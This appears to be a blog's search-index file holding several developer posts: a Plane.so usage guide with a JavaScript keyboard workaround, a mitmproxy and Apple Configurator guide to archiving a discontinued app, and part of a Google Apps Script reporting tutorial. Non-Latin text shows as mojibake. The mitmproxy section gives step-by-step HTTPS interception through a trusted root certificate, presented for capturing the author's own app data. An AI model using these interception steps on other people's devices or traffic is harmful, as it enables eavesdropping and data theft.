App ‚Ä¶ (settings will be introduced later) Choose the Cycle and select only one Sprint to work on, for example: W22, S22, 2024‚Äì05 ‚Ä¶ (settings will be introduced later) Currently does not support custom Issue Property Choose Add parent to add this Issue as a Sub-Issue under the Parent Issue Choosing Labels (a.k.a Tag Feature) Select Start Date, Due Date‚Ä¶ (Currently does not support exact time or Repeated Issue) Choose Estimate (also known as Scrum story point or estimated resources). Estimates can be adjusted or added in Settings; however, currently only one Estimate field can be enabled, and only 6 Estimate Values can be set. (The official Roadmap states this feature will be improved in 2024 Q2) Select Issue State. States can be adjusted or added in Settings:Create Issue Content Using AI: You can click the AI button next to Create to enter a prompt and automatically generate the default Issue content. Click Use this response to apply it to the Issue Description.After creating an issue, clicking it in the list will open the Issue Preview window, where you can click to expand into the Issue Full-Screen page:Click to expand and enter the Issue Full Screen Detail page: Image preview can be dragged or right-clicked to open in a new window for zooming (currently cannot click to zoom). You can click to add a Sub-Issue (Sub-Issues currently do not support sorting or Section features). Add emojis (currently only seven emojis: üëçüëéüòÄüí•üòï‚úàÔ∏èüëÄ). Upload attachments (not limited to images, but images currently have no preview function and must be clicked to view). Comment Section (Currently, Chinese input is sent automatically. Please refer to the solution at the end). Subscribe/Unsubscribe to this Issue to change notifications. Relates to Issues that can be linked. Blocking can mark Issues that are currently blocked by this Issue (no special function at the moment). Blocked by can mark the Issue that is currently blocking this Issue (no special features yet). Duplicate of marking duplicate Issues (currently no special features). Labels allow quick tagging and creating tags. Links related links, can include external links like Figma, Google Doc, etc. Delete and Archive Issues. Cycle Period The homepage shows the current Cycle, its execution status, and the burndown chart. Upcoming Cycles and Completed Cycles Currently, cycles must be created manually For example, create SXX every two weeks for each Sprint and set the specific time period. Cycle time periods cannot overlap Cycle time periods cannot be set in the past An issue can only be assigned to one Cycle Click to view Cycle details. At the top, you can use different display modes and filters to view Issues. On the right side, there is a burn-down chart and execution status. You can view Issues by Assignees, Labels, and States Modules Ê®°ÁµÑ Modules can be used as project collections, OKR goals, or functional categories (Design, FE, BE, App., etc.). Project Lead &amp; Members can be assigned Project progress and Issue State differ, with additional Planned and Paused statuses. Can set date range Click to view Module details. You can use different display modes and filters above to view Issues. On the right side, there is a burn-down chart and execution status. You can view Issues by Assignees, Labels, and States. You can add links to Modules. Views You can create Views for commonly used filter conditions and display modes, allowing quick access directly from there. You can use different display modes and filters to view Issues at the top of the View as well. Pages Simple Document Pages offers a WYSIWYG document editor, making it easy to write documents and insert images. Currently, directory and category functions are not supported. When there are many documents, it becomes very chaotic. Document permissions: Public - visible to all Project members; Private - visible only to yourself. Notifications Issues Personal Notification Features Notifications are sent for status changes, content updates, and new comments on subscribed Issues By default, Issues in projects you create, are assigned to you, or lead are subscribed to. Currently no Slack or third-party notifications Currently, notifications can only be sent via Email: Go to Profile Picture -&gt; Settings -&gt; Preferences -&gt; Email to enable Email notificationsDark Mode From Profile Picture -&gt; Settings -&gt; Preferences -&gt; Theme, you can select the Plane theme.Official ManualFor other operations and usage details, please refer to the official documentation.‚ö†Ô∏è‚ö†Ô∏èDisclaimer‚ö†Ô∏è‚ö†Ô∏è The above is the user guide for version 0.20-Dev dated 2024-05-25. The official team is actively developing new features and improving user experience. The mentioned feature limitations may be resolved in future updates, so please refer to the latest version for the best experience.During development, projects inevitably have bugs and experience issues. Please be patient with the Plane.so team; if you encounter any problems, feel free to report them below: Issue Report: https://github.com/makeplane/plane/issues Official Discord: https://discord.com/invite/A92xrEGCge Plane.so x Scrum Workflow ExampleArchitecture Each team has its own Workspace Each team will have a primary product Project. Projects: Other projects can be created, such as marketing advertising projects, customer support projects, or projects collaborating with external partners, separate from the main product development projects. Modules: Create Function Modules (design, frontend, backend, app) to help Team Leads track progress and link OKRs or project goals to modules (e.g., improve conversion rate, OKR-1 increase GMV‚Ä¶). Cycle: Create a Cycle based on the Sprint cycle. For example, if there is one Sprint per week, you can create W12 or use the Monday date like 2024‚Äì05‚Äì27. Since cycles cannot be created automatically at the moment, you need to set up future cycles monthly or weekly in advance. Always create an Issue for any task If possible, add Start Date &amp; Due Date, Modules, and Priority to the Issue. If an issue keeps switching between In-Progress and Cycle (not completed within one cycle), consider breaking the issue into smaller parts to facilitate project management Process Sprint Cycle: One Week Backlog: For any tasks or ideas, create an Issue with State = Backlog, fill in Estimate and Priority Weekly Sprint Planning Meeting: Select Issues from the Backlog and ongoing Issues (To Do or In Progress), set Priority/Estimate, plan the current Sprint, and add them to the Cycle If there is an urgent Issue inserted during the Sprint, it should also be added directly to this week‚Äôs Cycle. Daily Stand-up: Spend 15 minutes each morning quickly sharing the status of your issues. Issue ready to execute, start execution Change status to ToDo/In Progress Change the Issue status to Done, or create an additional Review State. Weekly Friday Sprint Review Meeting: Simply review this week‚Äôs issues (not planning for next week), quickly go over completed issues, and ensure estimates are filled in for future statistics. Try to ensure all Issues in the Cycle are completed by every Friday. Unfinished Issues should be either added to the next week‚Äôs Cycle or moved to Pending/Cancel. Continuously iterate the above process to manage all Issues and Projects ‚ö†Ô∏è‚ö†Ô∏èDisclaimer‚ö†Ô∏è‚ö†Ô∏è The above is just a workflow example. Please note that there is no perfect process, only the one that fits your team. Refer to the framework provided by Plane.so and use your creativity to find the best project management method.AppendixAPIPlane.so uses a clean front-end and back-end separation architecture, providing a complete API. After creating API Tokens in Workspace Settings, you can use the API by including the X-API-Key in the API Request Header. For API endpoint request methods, please refer to the official API Documentation. However, since the official documentation is incomplete, many request methods are missing. The quickest way is to open the browser‚Äôs developer tools, check the Network requests, see how the official API calls are made, and use your own Key to access them.Issue Comment: Problem of immediate submission after selecting text when typing in ChineseOpened an issue with the official team and checked the source code. The chance of a fix seems low because the need to select a language was never considered initially, so the Enter key event on the keyboard is directly bound to submit the comment.Browser Extension Workaround:Here is a self-written Workaround JavaScript script to hook the Enter event. First, install the JavaScript browser injection plugin:The above are shared Chromium extensions; other browsers can also search for similar JavaScript Inject injection tools. Go back to Plane.so, click Extensions -&gt; click ‚Äú+‚Äù Inject the following JavaScript into Plane.sodocument.addEventListener('keydown', function(event) { if (event.key === 'Enter' \\|\\| event.keyCode === 13) { // event.keyCode is for older browsers const focusedElement = document.activeElement; const targetButtons = focusedElement.parentElement.parentElement.parentElement.parentElement.parentElement.querySelectorAll('button[type=\"submit\"]'); if (targetButtons.length &gt; 0 &amp;&amp; targetButtons[0].textContent.trim().toLowerCase() === \"comment\") { console.log(\"HIT\"); // Focus the active element and place the cursor at the end focusedElement.focus(); if (window.getSelection) { var range = document.createRange(); var selection = window.getSelection(); range.selectNodeContents(focusedElement); range.collapse(false); selection.removeAllRanges(); selection.addRange(range); } event.stopImmediatePropagation(); } }},true); After pasting the code, click ‚ÄúSave‚Äù to save.Back to Plane.so (refreshed), open an Issue to test the Comment feature. Pressing Enter to select a word no longer submits automatically. Press Space + Shift Enter to insert a line break, and manually click Comment to submit your comment.‚ö†Ô∏è‚ö†Ô∏è‚ö†Ô∏è Security Issues ‚ö†Ô∏è‚ö†Ô∏è‚ö†Ô∏è Since Plane.so is still in development and the product is very new, its security is uncertain. It is recommended not to upload any sensitive data to avoid data leaks if the service faces major issues. Alternatively, use Self-Hosted to set up a local network-only environment.Plane Self-Hosted Setup Guide Plane.so Docker Self-Hosted Setup RecordIf you have any questions or feedback, feel free to contact me. üîó Copy link to share! üç∫ Buy me a beer on PayPal This post was originally published on Medium (View original post), and automatically converted and synced by ZMediumToMarkdown. Improve this page on Github." }, { "title": "App Lifecycle ManagementÔΩúMitmproxy & Apple Configurator for Preserving Removed Apps", "url": "/posts/zrealm-dev/app-lifecycle-management-mitmproxy-apple-configurator-for-preserving-removed-apps-b04f4fba3cf2/", "categories": "ZRealm Dev.", "tags": "english, ai-translation, ios-app-development, man-in-the-middle-attack, mitmproxy, python, app-development", "date": "2024-05-15 00:20:45 +0800", "snippet": " ÁÇπÂáªËøôÈáåÊü•ÁúãÊú¨ÊñáÁ´†ÁÆÄ‰Ωì‰∏≠ÊñáÁâàÊú¨„ÄÇ ÈªûÊìäÈÄôË£°Êü•ÁúãÊú¨ÊñáÁ´†Ê≠£È´î‰∏≠ÊñáÁâàÊú¨„ÄÇ This post was translated with AI assistance ‚Äî let me know if anything sounds off!What can be done to commemorate when an app product reaches its end?Using mitm...", "content": " ÁÇπÂáªËøôÈáåÊü•ÁúãÊú¨ÊñáÁ´†ÁÆÄ‰Ωì‰∏≠ÊñáÁâàÊú¨„ÄÇ ÈªûÊìäÈÄôË£°Êü•ÁúãÊú¨ÊñáÁ´†Ê≠£È´î‰∏≠ÊñáÁâàÊú¨„ÄÇ This post was translated with AI assistance ‚Äî let me know if anything sounds off!What can be done to commemorate when an app product reaches its end?Using mitmproxy + Apple Configurator to Keep an App Permanently in the Pre-Removal StatePrefaceJujutsu KaisenHaving worked for a long time and handled many products, I have started to encounter products I once participated in reaching their end (discontinuation). Developing a product from scratch is like nurturing a new life; the team worked hard for 3‚Äì4 months to bring it to birth. Although later stages were handed over to other caretakers (engineers) for further development, hearing that it is about to reach the end of its product life cycle still brings some regret. Life is the same; we never know whether the sun will rise first or an accident will happen tomorrow. The only thing we can do is cherish the present and do things well.RemembranceWherever we go, traces are left behind. We hope to do something before the product reaches its end, giving everyone a chance to reminisce and at least leave proof that it once existed. The following methods all require the app to still be online; if it has been removed, only memories remain.Non-technical Method ‚Äî RecordingBesides using the iPhone‚Äôs built-in screen recording feature, we can also connect the phone to a Mac and use QuickTime Player to record and export videos on the computer. Open QuickTime Player App on Mac Select ‚ÄúFile‚Äù -&gt; ‚ÄúNew Movie Recording‚Äù from the top left toolbar. After exiting the recording interface, click the ‚Äúv‚Äù next to the üî¥, and select your connected phone for the screen and speaker. The recording interface will then display the phone screen.Click ‚Äúüî¥‚Äù to start recording, then return to your phone to perform the actions you want to record.During recording, the current video size will be displayed. Press the ‚Äúüî¥‚Äù button again to stop recording.You can easily trim videos using the QuickTime Player toolbar. Finally, press ‚ÄúCommand‚Äù + ‚Äús‚Äù to export and save the video to a specified location, completing the recording.The advantage of recording videos is that future memories are easier to connect than with pictures. The longer you record, the more detailed the documentation. If you want to turn specific scenes into pictures, you can simply take screenshots, which is very convenient.Technical ApproachApp technical backup can be divided into two directions: the ‚Äúbone,‚Äù where the app itself is just a framework, and the ‚Äúflesh,‚Äù which is composed of API response data and forms the core content of the app. The app will disappear once it is removed from the App Store. Meat will disappear when the API host or server is shut down. Therefore, we also divided the backup into two technical methods: skeleton and flesh.Disclaimer This article is for technical research sharing only and does not encourage the use of any technology for illegal or infringing activities.[Core] Backup .ipa App Installation FilesOnce an app is removed from the store, it will remain on any device that has already downloaded it, as long as the user does not delete it. If you switch phones using a transfer method, the app will also be transferred.But if we accidentally delete the app or change phones without transferring it, then it‚Äôs truly goodbye forever; at this point, having a manual backup of the store‚Äôs .ipa file can bring it back to life.A long time ago, the reverse engineering article mentioned this, but this time we only need to back up the .ipa file without cracking; everything is done using Apple‚Äôs official tools.1. Install Apple Configurator 2First, go to the Mac App Store to download and install Apple Configurator 22. Connect your iPhone to your Mac and tap Trust This ComputerAfter a successful connection, the iPhone home screen will appear.3. Confirm that your phone has the app installed for the .ipa file you want to back upWe need to create a replacement screen in Apple Configurator 2 to obtain the .ipa file downloaded to the cache. Therefore, we must first ensure the target app is installed on the phone.4. Back to Apple Configurator 2 on MacDouble-tap the iPhone home screen displayed above to enter the information page.Switch to ‚ÄúApp‚Äù -&gt; Top right corner ‚Äú+ Add‚Äù -&gt; ‚ÄúApp‚ÄùAfter logging into your App Store account, you can access the list of apps you have previously purchased.Search for the target app you want to back up, then select it and click ‚ÄúAdd‚Äù.A waiting window will appear, showing ‚ÄúAdding App on XXX‚Äù and ‚ÄúDownloading ‚ÄòXXX‚Äô.‚Äù5. Extract .ipa File Wait for the download to complete, then a prompt will appear asking if you want to replace the existing installed app. Do not press any button at this time. Do not press any button at this time. Do not press any button at this time.Let‚Äôs open a Finder:In the top-left toolbar, select ‚ÄúGo‚Äù -&gt; ‚ÄúGo to Folder‚ÄùPaste the following path:~/Library/Group Containers/K36BKF7T3D.group.com.apple.configurator/Library/Caches/Assets/TemporaryItems/MobileAppsYou can find the target App .ipa file that has been downloaded and is ready to be installed:Simply copying it completes the App .ipa file backup.After completing the file copy, return to Apple Configurator 2 and click Stop to terminate the operation.[Core] Restore .ipa App Installation FileConnect the iPhone with the app to be restored to the Mac and open Apple Configurator 2, then go to the Add Apps interface.To restore, select ‚ÄúChoose from my Mac‚Ä¶‚Äù at the bottom left corner.Select the backup App .ipa file and click ‚ÄúAdd‚Äù.Wait for the transfer and installation to complete, then return to your phone to reopen the app and successfully revive it![Meat] Backup the Final API Response DataHere, we will use the method and the open-source project created previously in the article App End-to-End Testing Local Snapshot API Mock Server (refer to it for detailed principles):Similar to using recorded API Request &amp; Response for running E2E Testing, we can also use it to capture the final API Request &amp; Response data before an app is taken down or shut off.1. Install mitmproxybrew install mitmproxymitmproxy is an open-source man-in-the-middle attack and network request sniffing tool.If you are not familiar with how man-in-the-middle attacks work in Mitmproxy, you can first refer to my previous article: ‚ÄúAPP uses HTTPS transmission, but data was still stolen.‚Äù or the Mitmproxy official documentation.If you are using it for pure network request sniffing and are not comfortable with the mitmproxy interface, you can switch to Proxyman. Refer to the usage in the previous article.2. Complete mitmproxy Certificate Setup For HTTPS encrypted connections, root certificate replacement is required to perform a man-in-the-middle attack. Therefore, the first use requires downloading and enabling the root certificate on the mobile device. If your App &amp; API Server implement SSL Pinning, you also need to add the pinning certificate to mitmproxy. First, make sure your iPhone and Mac are connected to the same network. If there is no WiFi and your computer is on a wired network, you can also enable Mac‚Äôs WiFi sharing feature to let your phone connect to the Mac‚Äôs network. Start mitmproxy or mitmweb (Web GUI version) in the Terminal.mitmproxySeeing this screen means the mitmproxy service has started. There is no traffic currently, so it is empty. Stay on this screen and do not close the Terminal. Check the Mac‚Äôs IP Address in Mac Network SettingsGo back to the phone‚Äôs WiFi settings and tap the ‚Äúi‚Äù to enter detailed settings. Find the ‚ÄúConfigure Proxy‚Äù option at the bottom: Enter the Mac computer‚Äôs IP address on the server Enter port 8080 Save Open Safari on your phone and enter: http://mitm.it/If it appears:// If you can see this, traffic is not passing through mitmproxy.It means the mobile device‚Äôs network proxy server is not set up correctly or mitmproxy is not running on the Mac.Normally, the following will appear: At this point, only HTTP traffic can be sniffed; HTTPS traffic will cause errors. We will continue with the configuration.Indicates a successful connection. We found the iOS section and clicked ‚ÄúGet mimproxy-ca-cert.pem.‚Äù Click ‚ÄúAllow‚ÄùAfter the download is complete, go to your phone‚Äôs settings and you will see ‚ÄúProfile Downloaded.‚Äù Tap to enter. Click to enter, tap ‚ÄúInstall‚Äù at the top right, and enter your phone password to complete the installation.Go to Settings -&gt; ‚ÄúGeneral‚Äù -&gt; ‚ÄúAbout‚Äù -&gt; scroll to the bottom to ‚ÄúCertificate Trust Settings‚Äù -&gt; enable ‚Äúmitmproxy‚Äù. ‚ÄúContinue‚Äù to complete activation.At this point, we have completed all the preparatory work for the man-in-the-middle attack. Remember that all your phone‚Äôs current data traffic will go through the proxy on your Mac. After finishing, be sure to turn off the proxy server setting in your phone‚Äôs network settings, otherwise your phone‚Äôs WiFi will not connect to the internet.Back in the Terminal mitmproxy, you can see all captured API request logs while operating the app on your phone.Each request allows you to view detailed Request &amp; Response content:The above covers the basic setup and practical use of mitmproxy.3. Sniffing and Understanding API ArchitectureNext, use mitmproxy‚Äôs mitmdump service combined with the mitmproxy-rodo addons I developed earlier to record and replay requests. My implementation principle is to convert the request parameters into a hash value. During replay, the request is hashed again, and if a matching hash value backup response is found locally, it is returned. If multiple requests share the same hash value, they are stored and replayed in sequence.We can first sniff the app‚Äôs API using the above methods (or use Proxyman) to observe which fields might affect Hash Mapping. Record these fields to exclude them in later settings. For example, some APIs always include the ?ts parameter, which does not affect the returned content but impacts the Hash calculation, causing local backups to be unrecognized. We need to identify and exclude such parameters in the subsequent settings.4. Set up mitmproxy-rodo :Use the open-source script I wrote for recording and playback. For detailed parameter settings, please refer to the documentation of the open-source project.git clone git@github.com:ZhgChgLi/mitmproxy-rodo.gitcd mitmproxy-rodoFill the parameters selected in step 3 into the config.json configuration file:{ \"ignored\": { \"*\": { \"*\": { \"*\": { \"iterable\": false, \"enables\": [ \"query\", \"formData\" ], \"rules\": { \"query\": { \"parameters\": [ \"ts\", \"connect_id\", \"device_id\", \"device_name\" ] }, \"formData\": { \"parameters\": [ \"aidck\", \"device_id\", \"ver_name\" ] } } } } } }}The above parameters are excluded when calculating the hash value, and specific exclusion rules can be set for individual endpoint paths.5. Enable recording, then run the following in Terminal:mitmdump -s rodo.py --set dumper_folder=zhgchgli --set config_file=config.json --set record=true \"~d zhgchg.li\" The ending \"~d zhgchg.li\" means to exclude traffic only from *.zhgchg.li. dumper_folder : Output destination directory name 6. Return to the phone to operate the target app and perform the process path you want to record It is recommended to restart or reinstall the app to begin with the cleanest setup. It is recommended to record a video to help remember and reproduce the steps. While operating, you can see the output directory contains many captured API Response Data, stored according to Domain -&gt; API Path -&gt; HTTP Method -&gt; Hash Value -&gt; Header-X / Content-X (if the same Hash is requested twice, they will be saved sequentially). Re-recording allows you to directly delete the output directory and let it re-extract. If the returned data contains personal information, please remember to adjust the extracted content to anonymize it. [Meat] Playback Captured API Response DataAfter recording, be sure to replay once to test if the data is correct. If the Hash Hit is very low (almost no matching Response found during replay), you can repeat the sniffing steps to identify the variable that changes each time the App runs and affects the Hash value, then exclude it.Execution Replay:mitmdump -s rodo.py --set dumper_folder=zhgchgli --set config_file=config.json dumper_folder : Output destination directory name By default, if there is no Hash Mapping for the Response Data locally, a 404 will be returned directly, causing the app to display a blank screen. This way, you can know whether the fetched data is valid. Pages visited during recording are correctly displayed again during playback: OK! Recording captures pages not visited during the process, playback shows network error: OK! RemembranceAt this point, we can recreate the final moments before the app reached its end by restoring the framework and the last bits of content, cherishing the time when everyone worked together in unity to produce it.This article commemorates the team from my first job and my transition from web backend development to iOS app development through learning on the job. In just 3‚Äì4 months, I independently built the product from scratch and successfully launched it together with Android developers, designers, PM supervisors, and backend colleagues. Although the product is now nearing the end of its lifecycle, I will always remember the bittersweet experiences and the excitement of seeing it go live and being used for the first time. ‚ÄúThank you‚ÄùWelcome to ContributeIf you share the same regret, I hope this article can help you. The tool mitmproxy-rodo was originally developed as a POC (proof of concept). Contributions, bug reports, or PRs to fix bugs are welcome.If you have any questions or feedback, feel free to contact me. üîó Copy link to share! üç∫ Buy me a beer on PayPal This post was originally published on Medium (View original post), and automatically converted and synced by ZMediumToMarkdown. Improve this page on Github." }, { "title": "Google Apps ScriptÔΩúAutomate Daily Data Reports with RPA for Google Workspace", "url": "/posts/zrealm-robotic-process-automation/google-apps-script-automate-daily-data-reports-with-rpa-for-google-workspace-f6713ba3fee3/", "categories": "ZRealm Robotic Process Automation", "tags": "english, ai-translation, ios-app-development, robotic-process-automation, rpa-solutions, google-apps-script, google-sheets", "date": "2024-04-14 23:16:45 +0800", "snippet": " ÁÇπÂáªËøôÈáåÊü•ÁúãÊú¨ÊñáÁ´†ÁÆÄ‰Ωì‰∏≠ÊñáÁâàÊú¨„ÄÇ ÈªûÊìäÈÄôË£°Êü•ÁúãÊú¨ÊñáÁ´†Ê≠£È´î‰∏≠ÊñáÁâàÊú¨„ÄÇ This post was translated with AI assistance ‚Äî let me know if anything sounds off!Implementing Daily Data Report RPA Automation with Google Apps ScriptUsing Goo...", "content": " ÁÇπÂáªËøôÈáåÊü•ÁúãÊú¨ÊñáÁ´†ÁÆÄ‰Ωì‰∏≠ÊñáÁâàÊú¨„ÄÇ ÈªûÊìäÈÄôË£°Êü•ÁúãÊú¨ÊñáÁ´†Ê≠£È´î‰∏≠ÊñáÁâàÊú¨„ÄÇ This post was translated with AI assistance ‚Äî let me know if anything sounds off!Implementing Daily Data Report RPA Automation with Google Apps ScriptUsing Google Apps Script for Robotic Process Automation of Google Workspace ServicesPhoto by Possessed PhotographyRobotic Process AutomationRPA (Robotic Process Automation) translates to ‚ÄúProcess Automation Robots‚Äù in Chinese. Looking back at human history, from gathering by hand to the Stone Age and then to agricultural civilization, from the Industrial Revolution last century to the rise of information technology in the past 20 years, human work efficiency and productivity have grown exponentially. Along this journey, RPA applications have been everywhere: water wheels in the agricultural era (automating threshing), textile machines in the Industrial Revolution (automating weaving), factory robotic arms (automating assembly), and finally, the focus of this article‚Äîautomating information-related tasks such as automatic report queries and automatic notifications.To be honest, I only recently learned this term. Since my first job (7 years ago), I have been working on RPA tasks such as writing web crawlers for data statistics, automating CI/CD processes, automating data queries, automating stability data alerts, and automating daily routine operations. However, I used to refer to all of these simply as ‚Äúautomation.‚Äù It‚Äôs time to give it a proper name ‚Äî RPA (Robotic Process Automation).Previous RPA work mostly focused on ‚Äúmanually writing code to automate a single problem,‚Äù lacking comprehensive early-stage evaluation and analysis, use of No/Low Code tools, compliance, operation monitoring, real data statistics, continuous improvement, and corporate culture promotion. These are all essential parts of complete RPA. However, as mentioned earlier, I only recently learned about this professional field, so please allow me to start with a practical implementation article first!There are many platforms offering RPA services, such as Automation Anywhere, UiPath, Microsoft Power Automate, Blue Prism, as well as Zapier, IFTTT, Automate.io, and more.Choose the right service based on the actual problem you want to solve and the platform.Recommend a free and open-source browser-based RPA tool: Automa. Broadly speaking, transforming active dependencies between people or between people and tasks into dependencies on platforms by people or tasks is also a form of RPA. For example: Use Asana/Jira and other project management tools to manage tasks uniformly. Based on the concept of shifting from active to passive, a service that originally required manual checking for new notifications can be automated with RPA to notify us automatically when there are updates. For example: previously implemented Gmail to Slack to forward specific notification emails to the work group.Benefits Assessment of Robotic Process AutomationPreviously, in the ‚Äú2021 Pinkoi Tech Career Talk ‚Äî Secrets of High-Efficiency Engineering Teams,‚Äù I shared about the cost of cumulative small tasks and flow interruptions; assuming a routine repetitive task takes 15 minutes each time and occurs 10 times a week, nearly 130 hours are wasted annually; adding the ‚Äúflow switching‚Äù cost, the total waste could reach nearly 200 hours per year.2021 Pinkoi Tech Career Talk ‚Äî Secrets to High-Efficiency Engineering Teams Flow switching means the time it takes to pause from being fully focused and engaged in an important task, handle other matters, and then return to regain the same focused state.The benefits of developing RPA can be evaluated by the diagram below. As long as the development time and frequency of occurrence exceed the wasted time, it is worth investing resources to implement:https://twitter.com/swyx/status/1196401158744502272 X-axis: Task occurrence frequency e.g., 50/Day (50 times per day) Y-axis: How much manpower time is needed to complete each task Time-consuming range calculated over 5 years; the middle of the table shows the labor cost of wasted time over 5 years White indicates that the time cost of automation may exceed the benefits gained, making improvement not worthwhile. Green indicates items worth automating Red indicates a strong recommendation to automate. Besides saving time, automated standardized processes also reduce human error and improve stability.The Relationship Between Robotic Process Automation and AIWith the rise of AI, RPA is often mentioned; however, I believe RPA and AI are not directly related. RPA existed long before AI, and the benefits of implementing AI in businesses may not surpass those of improving RPA. RPA is more about corporate culture and work habits. Nonetheless, it is undeniable that AI can help RPA reach the next level. For example, RPA used to handle only precise, routine tasks, but with AI, it can perform fuzzy, more dynamic, and intelligent decision-making tasks.Robotic Process Automation at Google WorkspaceGoogle Workspace (formerly G Suite) is a great partner for our daily office collaboration. We use Gmail for email hosting, Google Docs for documents, Google Sheets for reports, Google Forms for surveys, and more. Connecting these services or communicating with internal and external systems requires us to implement RPA.But Google does not offer direct RPA services; however, you can achieve this through the following services: No Code: App Sheet (paid service) allows non-developers to create service integration automation directly through a GUI. Low Code: Google Apps Script (free service) enables quick and easy connection of Google services and external/internal systems with simple scripting. Function as a Service: Cloud Functions (paid service with free tier) lets you write full code and services, deploy, and run directly on Google Cloud. No Code platform App Sheet I haven‚Äôt used it before, but I have considerable experience with Cloud Functions and Google Apps Script. Below are some personal experiences and choices from my past use:Cloud Functions Deployment Required Supports multiple programming languages: Node.js, Python, Java, Go, PHP, Ruby‚Ä¶ Supports third-party package dependency management, installation, and usage Supports full authentication mechanism Maximum execution time limit: 60 minutes Pay as You Go: Charges Based on Usage Count, Execution Time, Different Processors, and Memory Used Cold Start Limitation (If not called for a long time, the first call will have a longer response time) Cannot directly connect to Google services; must go through Auth/API verification Free Plan DetailsCloud Functions offers a permanent free plan for compute time resources, including allocations based on GB-seconds and GHz-seconds. Besides 2 million invocations, this free plan provides 400,000 GB-seconds and 200,000 GHz-seconds of compute time, along with 5 GB of internet data transfer per month. The free plan usage is calculated at the equivalent USD amount of the Tier 1 pricing mentioned above. Regardless of whether the function runs in a Tier 1 or Tier 2 pricing region, the system allocates the equivalent USD amount. However, when deducting from the free plan quota, the system uses the function execution region‚Äôs tier (Tier 1 or Tier 2) as the basis.Please note, even if you use the free plan, you must have a valid billing account. In summary, Cloud Functions are recommended when a more complete and complex RPA integration is needed or when there are multiple external API integration requirements.Previous cases using Cloud Functions include: I use it only when integrating with non-Google Workspace services and when bridging other external services is required.Google Apps Script Convenient, simple, and fast Completely Free No complicated Auth authentication needed for service integration(Google Apps Script uses the currently logged-in account as the execution identity) Built-in scheduling and calendar trigger features Uses Google Network to perform web requests Development is only possible with Google Apps Script (based on JavaScript) No support for package managers or version control features Due to security concerns, customizing the Request User-Agent information is not possible Execution time limit: the script must finish within 6 minutes or it will be terminated. Other limits and quotas can be found in the official GAS Information: Previous cases using Google Apps Script include: Due to execution time limits and API request customization restrictions, I only use Google Apps Script for simple and quick services. For needs involving integration with Google services, I prioritize Google Apps Script (because implementing full Google service authentication in Cloud Functions requires more effort).Robotic Process Automation with Google Apps Script ‚Äî Workday Report (Google Sheet x Google Analytics)Finally, we arrive at the main topic of this article: implementing Google service RPA automation using Google Apps Script.BackgroundThe product team needs to query Google Analytics data daily and fill it into a Google Sheet report for team trend analysis. The daily data should also be published on a Dashboard screen for all members to stay updated.Colleagues spend about 30 minutes every day upon arriving at the office to complete this task; if there are other matters to handle, they must wait until this routine work is finished before starting or may delay sending the daily data message.A Simple Estimate of RPA Benefits: Annual consumption expenditure:1 person x 30 mins x 365 days (including holidays) = 182 hours Automation Cost:In this case, it takes about 1 person x 5 days = 40 hours Therefore, we only need to invest one week of development time to handle the workload of the colleague responsible for data checking in the long term, enabling them to focus on more important tasks.GoalOur goal is to use Google Apps Script to build an RPA that automatically fetches daily data from Google Analytics and internal system report APIs, then fills it into Google Sheets, along with creating a Web UI Dashboard.Final Result Google Sheet:https://docs.google.com/spreadsheets/d/1-9lZCpsu3E7eDmO-lMkXJXQ6Y6KK4SiyU6uBODcDcFE/edit?usp=sharing Web GUI URL:https://script.google.com/macros/s/AKfycbz2Vk-ikU8DSXjpnLq9r6HNAn3zlNAosvDoItG0cxy0bmItRDSVyEzTdwsL2HyFUz99/exec The data is fake and for demo use only; from 2024/04/13 onward, it will be especially low or remain at 0 because my zhgchg.li GA truly has ‚Äú0‚Äù traffic Q_Q.Tasks to Complete Creating Google Apps Script and Getting Familiar with the Editor Get/Create the Sheet for the Corresponding Date Integrate Google Analytics to Retrieve Data Fill in the data Set Schedule for Daily Automatic Execution DisclaimerDue to the article‚Äôs explanation needs, the following code minimizes abstraction to enhance clarity. You can modify it according to your actual requirements. At the end of the article, there is a complete public Google Sheet &amp; Google Apps Script. If you don‚Äôt want to follow the steps one by one, you can directly modify the template attached at the end.Step 1. Create Google Apps ScriptSimply select ‚ÄúExtensions‚Äù -&gt; ‚ÄúApps Script‚Äù on the report where we want to implement automation to automatically create a Google Apps Script linked to the Google Sheet report.You can also create Google Apps Script directly from the Google Apps Script homepage, but this will not link it to Google Sheets. Linking is not required to operate the corresponding Google Sheet. Both creation methods are possible. The difference is who owns the script: if linked to a report, the owner is the report owner; if created independently, the owner is the creator. Ownership matters because if the account is deactivated due to resignation, the script may become invalid or be deleted.After creating the script, we can first rename our script project from the top.Basic Knowledge of Google Apps ScriptBefore moving on to the next step of writing the program, let‚Äôs first cover some basic knowledge of Google Apps Script.About the EditorDefault import of Google service SDKs (can be called without explicit import): CalendarApp Calendar DocumentApp Google Drive FormApp Google Form SpreadsheetApp Google Sheet GmailApp Gmail Others‚Ä¶ Files:You can add multiple .gs files to store different object codes for better organization; all files run under the same namespace and lifecycle, so be careful as duplicate object or variable names may overwrite each other.Besides .gs script files, you can also add .html HTML Template files for rendering the Web UI. (This will be explained later) Database:Databases written by others (a.k.a Lib) can be imported and used via their Script ID. Of course, programs we write can also be deployed as databases for others to use.There are also some powerful tools packaged by experts available. The downside is that Script IDs can only be found through Google search, as there is no official database list for reference.e.g. HTML Parser Tool Cheer.io Script ID: 1ReeQ6WO8kKNxoaA_O0XEQ589cIrRvEBA9qcWpNqdOP17i47u6N9M5Xh0 Service:The SDK for Google services allows you to add and use services that are not included by default.e.g. Google Analytics Data Restore, Next Step Operation Save or Control + s Run or Control + rIf an error occurs, directly prompt in the Console and terminate the script DebuggingWhen the execution reaches a breakpoint (10), it will pause and open the Debug View on the right. You can then continue running the program.If an error occurs, the execution will pause and open the Debug View on the right. Debugging and Running Target Method (Function Name)Only methods within the currently selected file can be chosen. View Editor Execution Log Another point is formatting: in some browsers, pressing ‚ÄúControl + [‚Äù to indent may trigger the back action. Be careful with this!Google Apps Script GitHub Assistant Chrome Extension version control plugin It is recommended to install this extension to connect Google Apps Script with git, enabling version control to prevent accidental loss of work. If you encounter a Push/Pull Error or clicking has no response, please first follow the steps above: ‚ÄúOptions‚Äù -&gt; Connect to Github or re-verify Google authorization.Logger MessageYou can use the following script with Debug to print debug logs in the console below.Logger.log(\"Hi\")Execution Records and Error InformationIf logs or errors occur while running in the editor, they will be displayed directly. To check execution records or errors that happen during automatic runs, go to the ‚ÄúExecutions‚Äù tab.Automatic TriggerThe ‚ÄúTrigger Conditions‚Äù tab allows you to set how methods in the script are automatically triggered. The available automatic trigger conditions include: When Google Sheet: opens, edits, content changes, or form is submitted Scheduled cycle trigger: Execute once every X minutes, X hours, X days, X weeks, or X months Trigger on specific date: 